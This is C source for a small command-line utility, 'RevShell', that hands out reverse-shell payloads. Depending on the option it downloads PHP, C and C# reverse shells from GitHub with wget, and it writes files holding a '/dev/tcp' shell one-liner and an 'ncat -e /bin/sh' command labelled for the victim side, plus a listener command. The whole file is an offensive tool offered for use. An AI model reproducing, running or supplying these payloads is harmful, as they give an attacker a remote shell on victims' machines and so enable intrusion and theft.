#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void PrintHelp();
void GetPhp();
void GetShell();
void GetC();
void GetCsharp();
void GetNcat();

int main(int argc , char* argv[])
{
	if (argc < 2 || argc == 1)
	{
		printf("RevShell version 0.0.1\n\nUse -h or --help for help\n");
	}
	
	else if ((strcmp(argv[1],"-h"))==0 || (strcmp(argv[1],"--help"))==0 )
	{
		PrintHelp();
	}
	// (strcmp(argv[1],"--type"))==0 && argc == 3
	else if ((strcmp(argv[1],"--type"))==0 && argc == 3 )
	{
		char* argument = argv[2];
		if ((strcmp(argument,"php")==0))
		{
			GetPhp();
		}
		else if ((strcmp(argument,"shell")==0))
		{
			GetShell();
		}
		else if ((strcmp(argument,"csharp")==0))
		{
			GetCsharp();
		}
		else if ((strcmp(argument,"ncat")==0))
		{
			GetNcat();
		}
		else if ((strcmp(argument,"c")==0))
		{
			GetC();
		}
		else
		{	
			printf("Usage : --type <php,shell,csharp,c,ncat>\n");
		}
		
	}
	else if ((strcmp(argv[1],"-t"))==0 && argc == 3 )
	{
		char* argument1 = argv[2];
		if ((strcmp(argument1,"php")==0))
		{
			GetPhp();
		}
		else if ((strcmp(argument1,"shell")==0))
		{
			GetShell();
		}
		else if ((strcmp(argument1,"csharp")==0))
		{
			GetCsharp();
		}		
		else if ((strcmp(argument1,"ncat")==0))
		{
			GetNcat();
		}
		else if ((strcmp(argument1,"c")==0))
		{
			GetC();
		}
		else
		{	
			printf("Usage : -t <php,shell,csharp,c,ncat>\n");
		}
		
	}
	else
	{
		printf("Invalid parameter !\n\nUse -h or --help for help\n");
	}
	return 0;
}

void PrintHelp()
{
	printf("Usage : ./program [OPTION] .. [FILE]\n\nOptions :\n\n-h --help print this help page\n-t --type <php,csharp,shell,c,ncat>\n-o --output output file\n\nContact me when you find bugs <mrtankgt@outlook.com> MrEbrahimXD\n");
}

void GetPhp()
{
	printf("[*] Php RevShell Copied to current dir at <place>\n\n");
	// Php Reverse shell by pentest monkey <pentestmonkey.com>
	system("wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php \n");
}

void GetShell()
{
	printf("[*] Made shell_revshell.txt UDP and TCP Change Ip and Port at <place>\n");
	system("echo \"sh -i >& /dev/tcp/<ip>/<port> 0>&1\" > shell_revshell_tcp.txt && echo \"sh -i >& /dev/tcp/<ip>/<port> 0>&1\" > shell_revshell_udp.txt \n\n");
}

void GetCsharp()
{
	printf("[*] Made C# script at <place> \n");
	system("wget https://raw.githubusercontent.com/MrEbrahimXD/Raw-For-Revshell/main/csharp.cs \n");
}

void GetNcat()
{
	printf("[*] Ncat ncat_help.txt created\n\n");
	system("echo \"Victim : ncat -e /bin/sh <ip> <port> \n Listener : ncat -lnvp <port>\" > ncat_help.txt \n");
}

void GetC()
{
	printf("[*] C programming script created\n\n");
	system("wget https://raw.githubusercontent.com/MrEbrahimXD/Raw-For-Revshell/main/c_revshell.c \n");
}